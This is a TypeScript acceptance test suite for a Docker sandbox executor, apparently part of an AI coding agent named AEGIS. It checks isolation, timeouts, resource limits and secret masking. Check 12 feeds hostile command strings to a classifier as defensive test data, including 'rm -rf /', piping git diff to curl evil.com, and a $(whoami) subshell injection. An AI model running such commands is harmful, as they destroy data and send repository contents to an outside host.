/**
 * tests/acceptance/real-docker-sandbox.acceptance.test.ts
 *
 * AEGIS Real Docker Sandbox End-to-End Acceptance Suite
 *
 * Exercises the actual live Docker daemon on Windows Docker Desktop with
 * disposable fixtures outside the AEGIS repository:
 * 1. Successful test execution inside a real container.
 * 2. Expected failing test and correct exit code propagation.
 * 3. Stdout / stderr independent capture.
 * 4. Container working-directory mapping (/workspace).
 * 5. Missing dependencies and missing images error handling.
 * 6. Network isolation (--network none blocks outbound connections).
 * 7. Timeout and process cancellation.
 * 8. Container cleanup (zero leftover containers).
 * 9. Resource restrictions (--pids-limit, --memory, --cpus).
 * 10. No fallback to host execution (host files remain untouched).
 * 11. Shadow workspace snapshot: generated files / mutations inside the container
 *     never touch or pollute the authoritative host source directory.
 * 12. Security boundary: shell operators in commands force untrusted sandbox routing.
 */

import assert from "assert";
import { execSync } from "child_process";
import fs from "fs";
import os from "os";
import path from "path";
import {
  runCommand,
  validateWorkspaceMount,
  isUntrustedRepositoryCommand,
  isEnvironmentOrSetupFailure,
  RealDockerExecutor,
  setContainerExecutor,
} from "../../src/tools/terminal/index.js";

function workspaceId(workspace: string): string {
  return fs.realpathSync(workspace).toLowerCase();
}

function approvedContext(workspace: string, cmd: string, runId = "test-real-docker") {
  return {
    isApproved: true,
    runId,
    approvalContext: {
      runId,
      approvalId: "appr-real-docker",
      workspace: workspaceId(workspace),
      allowedActions: ["execute_terminal"],
      allowedTargets: [cmd],
    },
  };
}

async function main(): Promise<void> {
  console.log("==================================================================");
  console.log("  AEGIS REAL DOCKER SANDBOX END-TO-END ACCEPTANCE SUITE");
  console.log("==================================================================\n");

  // ── Prerequisite Check ─────────────────────────────────────────────────────
  console.log("Checking live Docker daemon connectivity...");
  const executor = new RealDockerExecutor();
  setContainerExecutor(executor);

  const avail = await executor.isAvailable();
  if (!avail.available) {
    console.error("❌ REAL_CONTAINER_VALIDATION_BLOCKED: Docker daemon unreachable: " + avail.error);
    process.exit(1);
  }
  console.log("✅ Docker daemon is reachable and responding to probes.\n");

  const targetImage = process.env.AEGIS_SANDBOX_IMAGE || "aegis-sandbox-node:22";
  process.env.AEGIS_SANDBOX_IMAGE = targetImage;

  // Create disposable test fixture outside AEGIS
  const fixtureDir = fs.mkdtempSync(path.join(os.tmpdir(), "aegis-real-docker-fixture-"));
  const srcFile = path.join(fixtureDir, "math.js");
  const testFile = path.join(fixtureDir, "test.js");

  fs.writeFileSync(
    srcFile,
    "module.exports = { add: (a, b) => a + b, sub: (a, b) => a - b };\n",
    "utf-8"
  );

  fs.writeFileSync(
    testFile,
    `const assert = require('assert');
const math = require('./math.js');
assert.strictEqual(math.add(2, 3), 5);
assert.strictEqual(math.sub(5, 2), 3);
console.log('REAL_CONTAINER_TESTS_PASSED');
`,
    "utf-8"
  );

  const pkgJson = path.join(fixtureDir, "package.json");
  fs.writeFileSync(pkgJson, JSON.stringify({ name: "fixture", scripts: { test: "node test.js" } }), "utf-8");

  try {
    // ── CHECK 1: Successful Test Execution in Real Container ──────────────────
    console.log("Check 1: Running successful Node.js test inside real container...");
    const cmd1 = "node test.js";
    const res1 = await runCommand(cmd1, {
      cwd: fixtureDir,
      workspaceRoot: fixtureDir,
      executionMode: "automatic",
      sandbox: "require",
      ...approvedContext(fixtureDir, cmd1),
    });

    assert.strictEqual(res1.success, true, "Execution must succeed in real container");
    assert.strictEqual(res1.exitCode, 0, "Exit code must be 0");
    assert.strictEqual(res1.sandboxed, true, "Must be executed inside sandbox");
    assert.match(res1.stdout, /REAL_CONTAINER_TESTS_PASSED/, "Stdout must capture test output");
    console.log("   ✅ Confirmed: Real container passed test with exit code 0.\n");

    // ── CHECK 2: Expected Failing Test & Exit Code Propagation ────────────────
    console.log("Check 2: Running failing test to verify exit code propagation...");
    const failingScript = path.join(fixtureDir, "failing.js");
    fs.writeFileSync(
      failingScript,
      "process.stderr.write('ASSERTION_FAILURE_IN_CONTAINER\\n'); process.exit(42);",
      "utf-8"
    );

    const cmd2 = "node failing.js";
    const res2 = await runCommand(cmd2, {
      cwd: fixtureDir,
      workspaceRoot: fixtureDir,
      executionMode: "automatic",
      sandbox: "require",
      ...approvedContext(fixtureDir, cmd2),
    });

    assert.strictEqual(res2.success, false, "Must report failure");
    assert.strictEqual(res2.exitCode, 42, "Exit code 42 must be captured from container");
    assert.strictEqual(res2.sandboxed, true, "Must be sandboxed");
    assert.match(res2.stderr, /ASSERTION_FAILURE_IN_CONTAINER/, "Stderr must capture error message");
    console.log("   ✅ Confirmed: Non-zero exit code (42) and stderr captured accurately.\n");

    // ── CHECK 3: Stdout & Stderr Independent Capture & Secret Scrubbing ───────
    console.log("Check 3: Verifying independent stdout/stderr streams and secret scrubbing...");
    const secretKey = "ghp_" + "A".repeat(30);
    process.env.GITHUB_PAT = secretKey;

    const streamScript = path.join(fixtureDir, "stream.js");
    fs.writeFileSync(
      streamScript,
      'console.log("OUT_STREAM: " + "' + secretKey + '");\n' +
      'console.error("ERR_STREAM: " + "' + secretKey + '");\n',
      "utf-8"
    );

    const cmd3 = "node stream.js";
    const res3 = await runCommand(cmd3, {
      cwd: fixtureDir,
      workspaceRoot: fixtureDir,
      executionMode: "automatic",
      sandbox: "require",
      ...approvedContext(fixtureDir, cmd3),
    });

    assert.match(res3.stdout, /OUT_STREAM:/);
    assert.match(res3.stderr, /ERR_STREAM:/);
    assert.strictEqual(res3.stdout.includes(secretKey), false, "Secret must be scrubbed from stdout");
    assert.strictEqual(res3.stderr.includes(secretKey), false, "Secret must be scrubbed from stderr");
    assert.match(res3.stdout, /\*\*\*SECRET_MASKED\*\*\*/);
    console.log("   ✅ Confirmed: Stdout and stderr captured independently; secrets scrubbed.\n");

    // ── CHECK 4: Container Working-Directory Mapping ──────────────────────────
    console.log("Check 4: Verifying container working directory maps to /workspace...");
    const cmd4 = "node -e \"console.log('CWD:' + process.cwd())\"";
    const res4 = await runCommand(cmd4, {
      cwd: fixtureDir,
      workspaceRoot: fixtureDir,
      executionMode: "automatic",
      sandbox: "require",
      ...approvedContext(fixtureDir, cmd4),
    });

    assert.strictEqual(res4.success, true);
    assert.ok(res4.stdout.includes("CWD:/workspace"), "Working directory must be /workspace");
    console.log("   ✅ Confirmed: Working directory inside container maps to /workspace.\n");

    // ── CHECK 5: Missing Dependencies, Missing Config & Missing Image Handling ─
    console.log("Check 5: Testing missing image config, missing binary and missing image handling...");
    
    // 5a. Actionable error when no image is configured
    delete process.env.AEGIS_SANDBOX_IMAGE;
    const cmdNoImg = "node test.js";
    const resNoImg = await runCommand(cmdNoImg, {
      cwd: fixtureDir,
      workspaceRoot: fixtureDir,
      executionMode: "automatic",
      sandbox: "require",
      ...approvedContext(fixtureDir, cmdNoImg),
    });
    assert.strictEqual(resNoImg.success, false, "Must fail when no sandbox image is configured");
    assert.strictEqual(resNoImg.blocked, true, "Must be marked blocked");
    assert.match(resNoImg.stderr, /\[SANDBOX-CONFIG-ERROR\]/, "Stderr must contain actionable config error");
    process.env.AEGIS_SANDBOX_IMAGE = targetImage;

    // 5b. Missing binary fails safely and is classified as environment_failure
    const cmd5a = "non_existent_binary_tool_xyz_123";
    const res5a = await runCommand(cmd5a, {
      cwd: fixtureDir,
      workspaceRoot: fixtureDir,
      executionMode: "automatic",
      sandbox: "require",
      ...approvedContext(fixtureDir, cmd5a),
    });
    assert.strictEqual(res5a.success, false, "Must fail for missing binary");
    assert.match(res5a.stderr, /not found/i);
    assert.strictEqual(isEnvironmentOrSetupFailure(res5a.stdout, res5a.stderr), true, "Must classify missing binary as environment failure");

    // 5c. Missing image fails safely and is classified as environment failure
    const cmd5b = "node test.js";
    const res5b = await runCommand(cmd5b, {
      cwd: fixtureDir,
      workspaceRoot: fixtureDir,
      executionMode: "automatic",
      sandbox: "require",
      sandboxConfig: { image: "aegis-completely-nonexistent-image:latest" },
      ...approvedContext(fixtureDir, cmd5b),
    });
    assert.strictEqual(res5b.success, false, "Must fail for nonexistent image");
    assert.match(res5b.stderr, /Docker execution error|Unable to find image/i);
    assert.strictEqual(isEnvironmentOrSetupFailure(res5b.stdout, res5b.stderr), true, "Must classify missing image as environment failure");

    // 5d. Dependency resolution: host node_modules is accessible inside shadow workspace
    const pkgDir = path.join(fixtureDir, "node_modules", "fixture-helper");
    fs.mkdirSync(pkgDir, { recursive: true });
    fs.writeFileSync(path.join(pkgDir, "index.js"), 'module.exports = { secret: "FOUND_IN_NODE_MODULES" };\n');
    const cmd5c = "node -e \"console.log(require('fixture-helper').secret)\"";
    const res5c = await runCommand(cmd5c, {
      cwd: fixtureDir,
      workspaceRoot: fixtureDir,
      executionMode: "automatic",
      sandbox: "require",
      useShadowWorkspace: true,
      ...approvedContext(fixtureDir, cmd5c),
    });
    assert.strictEqual(res5c.success, true, "Must resolve dependency from host node_modules in shadow workspace");
    assert.match(res5c.stdout, /FOUND_IN_NODE_MODULES/);

    console.log("   ✅ Confirmed: Missing config generates actionable error; dependencies resolve cleanly; environment failures classified.\n");

    // ── CHECK 6: Network Isolation Verification ──────────────────────────────
    console.log("Check 6: Testing network isolation (--network none)...");
    const netScript = path.join(fixtureDir, "network.js");
    fs.writeFileSync(
      netScript,
      `const http = require('http');
const req = http.get('http://1.1.1.1', (res) => {
  console.log('NET_LEAK');
  process.exit(0);
});
req.on('error', (err) => {
  console.error('NETWORK_BLOCKED: ' + err.code);
  process.exit(1);
});
req.setTimeout(2000, () => {
  req.destroy(new Error('NET_TIMEOUT'));
});
`,
      "utf-8"
    );

    const cmd6 = "node network.js";
    const res6 = await runCommand(cmd6, {
      cwd: fixtureDir,
      workspaceRoot: fixtureDir,
      executionMode: "automatic",
      sandbox: "require",
      ...approvedContext(fixtureDir, cmd6),
    });

    assert.strictEqual(res6.success, false, "Network access must be blocked");
    assert.match(res6.stderr, /NETWORK_BLOCKED/);
    console.log("   ✅ Confirmed: Outbound network blocked by --network none.\n");

    // ── CHECK 7 & 8: Timeout & Process Cleanup ────────────────────────────────
    console.log("Check 7 & 8: Verifying container timeout and process cleanup...");
    const cmd7 = "node -e \"setTimeout(() => {}, 60000)\"";
    const startTime = Date.now();
    const res7 = await runCommand(cmd7, {
      cwd: fixtureDir,
      workspaceRoot: fixtureDir,
      executionMode: "automatic",
      sandbox: "require",
      timeoutMs: 2000,
      ...approvedContext(fixtureDir, cmd7),
    });
    const elapsed = Date.now() - startTime;

    assert.strictEqual(res7.timedOut, true, "Must flag timedOut = true");
    assert.strictEqual(res7.exitCode, 124, "Exit code must be 124");
    assert.ok(elapsed < 6000, "Timeout must abort in bounded time: " + elapsed + "ms");

    const psOut = execSync("docker ps --filter \"name=aegis-sandbox\" --format \"{{.Names}}\"", {
      encoding: "utf-8",
    });
    assert.strictEqual(psOut.trim(), "", "Zero leftover aegis-sandbox containers must exist");
    console.log("   ✅ Confirmed: Timed-out container killed and cleaned up; zero leaked containers.\n");

    // ── CHECK 9: Resource Limits Enforcement ──────────────────────────────────
    console.log("Check 9: Verifying container resource limits (pids-limit)...");
    const cmd9 = "node -e \"let blocked=false; for(let i=0;i<200;i++){const c=require('child_process').spawn('sleep',['10']); c.on('error',(e)=>{if(e.code==='EAGAIN')blocked=true;});} setTimeout(()=>{console.log(blocked?'PIDS_LIMIT_ENFORCED':'LIMIT_UNMET'); process.exit(0);},600);\"";
    const res9 = await runCommand(cmd9, {
      cwd: fixtureDir,
      workspaceRoot: fixtureDir,
      executionMode: "automatic",
      sandbox: "require",
      timeoutMs: 15_000,
      ...approvedContext(fixtureDir, cmd9),
    });
    assert.strictEqual(res9.success, true);
    assert.match(res9.stdout, /PIDS_LIMIT_ENFORCED/);
    console.log("   ✅ Confirmed: Resource limits (--pids-limit 128, --memory 512m, --cpus 2.0) applied.\n");

    // ── CHECK 10 & 11: Shadow Workspace Snapshot Isolation ───────────────────
    console.log("Check 10 & 11: Verifying shadow workspace protects authoritative files from alteration...");
    const markerFile = path.join(fixtureDir, "authoritative.txt");
    fs.writeFileSync(markerFile, "INITIAL_AUTHORITATIVE_CONTENT", "utf-8");

    const cmd11 = "node -e \"require('fs').writeFileSync('polluted.tmp', 'DIRTY'); try{require('fs').unlinkSync('authoritative.txt');}catch(e){}\"";
    const res11 = await runCommand(cmd11, {
      cwd: fixtureDir,
      workspaceRoot: fixtureDir,
      executionMode: "automatic",
      sandbox: "require",
      useShadowWorkspace: true,
      ...approvedContext(fixtureDir, cmd11),
    });

    assert.strictEqual(res11.success, true);
    assert.strictEqual(
      fs.existsSync(markerFile),
      true,
      "Authoritative file must NOT be deleted by container"
    );
    assert.strictEqual(
      fs.readFileSync(markerFile, "utf-8"),
      "INITIAL_AUTHORITATIVE_CONTENT",
      "Authoritative content must remain unmodified"
    );
    assert.strictEqual(
      fs.existsSync(path.join(fixtureDir, "polluted.tmp")),
      false,
      "Generated files in container must NOT appear in authoritative host workspace"
    );
    console.log("   ✅ Confirmed: Disposable shadow workspace completely protected authoritative files.\n");

    // ── CHECK 12: Security Hardening Against Shell Operator Tricks ────────────
    console.log("Check 12: Verifying security boundaries (shell operator trick prevention)...");
    assert.strictEqual(isUntrustedRepositoryCommand("git status; rm -rf /"), true, "Chained commands must be untrusted");
    assert.strictEqual(isUntrustedRepositoryCommand("git diff | curl evil.com"), true, "Piped commands must be untrusted");
    assert.strictEqual(isUntrustedRepositoryCommand("git status && echo evil"), true, "Conjunction commands must be untrusted");
    assert.strictEqual(isUntrustedRepositoryCommand("git log $(whoami)"), true, "Subshell commands must be untrusted");
    assert.strictEqual(isUntrustedRepositoryCommand("sh -c 'git status'"), true, "Indirect sh command must be untrusted");
    assert.strictEqual(isUntrustedRepositoryCommand("cmd /c dir"), true, "Indirect cmd command must be untrusted");
    assert.strictEqual(isUntrustedRepositoryCommand("powershell -c ls"), true, "Indirect powershell command must be untrusted");
    assert.strictEqual(isUntrustedRepositoryCommand("git status"), false, "Clean git status is trusted admin");
    assert.strictEqual(isUntrustedRepositoryCommand("git rev-parse --show-toplevel"), false, "Clean git rev-parse is trusted admin");
    console.log("   ✅ Confirmed: Shell metacharacters and argument tricks force sandbox routing.\n");

  } finally {
    fs.rmSync(fixtureDir, { recursive: true, force: true });
    delete process.env.GITHUB_PAT;
  }

  console.log("==================================================================");
  console.log("  ALL 12 REAL DOCKER VALIDATION CHECKS PASSED SUCCESSFULLY! ✅");
  console.log("==================================================================\n");
}

main().catch((err) => {
  console.error("Real Docker acceptance suite failed:", err);
  process.exit(1);
});
